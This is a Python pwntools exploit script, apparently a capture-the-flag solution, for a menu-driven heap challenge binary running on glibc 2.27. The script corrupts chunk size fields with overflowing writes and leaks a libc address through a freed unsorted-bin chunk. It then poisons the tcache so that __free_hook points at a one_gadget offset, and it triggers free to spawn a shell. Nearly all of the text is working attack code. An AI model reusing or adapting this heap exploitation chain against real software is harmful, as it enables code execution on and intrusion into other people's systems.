from pwn import*
from LD import*
def new(size,content):
	p.sendlineafter('choice :','1')
	p.sendlineafter(': ',str(size)) #0x18 OR 0x38
	p.sendafter('Content:',content)
def edit(index,content):
	p.sendlineafter('choice :','2')
	p.sendlineafter('Index :',str(index))
	p.sendafter('Content:',content)
def show(index):
	p.sendlineafter('choice :','3')
	p.sendlineafter('Index :',str(index))
def free(index):
	p.sendlineafter('choice :','4')
	p.sendlineafter('Index :',str(index))

libc = ELF('./libc-2.27.so',checksec=False)
LD=change_ld('./main','./ld-2.27.so')
p = LD.process(env={'LD_PRELOAD':'./libc-2.27.so'})
#p = remote('ha1cyon-ctf.fun',30032)
p = process('./main')
context.log_level ='DEBUG'
for i in range(8):
	new(0x18,'FMYY')
for i in range(7):
	edit(i,'\x00'*0x10 + p64(0) + '\xC1')
for i in range(1,8):
	free(i)
new(0x38,'FMYY') #1
new(0x38,'FMYY') #2
new(0x38,'FMYY') #3
new(0x38,'FMYY') #4
new(0x38,'FMYY') #5
edit(1,'\x00'*0x38 + '\xC1')
free(2)
new(0x38,'FMYY') #2
show(3)
p.recvuntil('Content : ')
libc_base  = u64(p.recv(6).ljust(8,'\x00')) - 0x60 - 0x10 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
rce = libc_base + 0x4F322
new(0x38,'FMYY') #6
new(0x38,'FMYY') #7
free(3)
edit(6,p64(free_hook)) 
new(0x38,'FMYY') #3
new(0x38,p64(rce)) #4
free(0)
p.interactive()
